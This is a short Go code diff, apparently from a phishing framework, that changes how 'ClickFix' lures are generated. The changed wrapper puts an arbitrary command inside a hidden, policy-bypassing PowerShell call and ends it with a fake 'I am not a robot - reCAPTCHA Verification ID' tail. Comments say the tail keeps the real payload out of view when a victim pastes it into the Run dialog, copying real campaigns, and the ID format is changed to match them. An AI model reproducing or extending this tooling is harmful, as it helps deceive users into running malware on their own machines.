@@ -73,7 +73,11 @@ func wrapClickFixPayload(command, vid string) string {
 		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
 		return strings.ReplaceAll(command, "{VID}", vid)
 	}
-	return `powershell -w hidden -ep bypass -c "` + command + `;$id='Performance & security by Cloudflare - Verification ID: ` + vid + `'"`
+	// Unified tail for every template (matches the real-world ClickFix
+	// campaigns): the visible end of the pasted Run-dialog string reads
+	// "I am not a robot - reCAPTCHA Verification ID: XXXX" while the payload
+	// itself scrolls out of view. No apostrophe — safe inside PS single quotes.
+	return `powershell -w hidden -ep bypass -c "` + command + `;$id='I am not a robot - reCAPTCHA Verification ID: ` + vid + `'"`
 }
 
 // renderClickFix substitutes all placeholders:
@@ -92,9 +96,9 @@ func renderClickFix(tmpl, command, redirectUrl, subdomain, vid string) string {
 	return out
 }
 
-// genVID generates a random 6-digit verification ID.
+// genVID generates a random 4-digit verification ID (real-campaign format).
 func genVID() string {
-	return fmt.Sprintf("%06d", rand.Intn(1000000))
+	return fmt.Sprintf("%04d", rand.Intn(10000))
 }
 
 // serveClickFixBefore serves the clickfix gate at the lure path (pre-login).
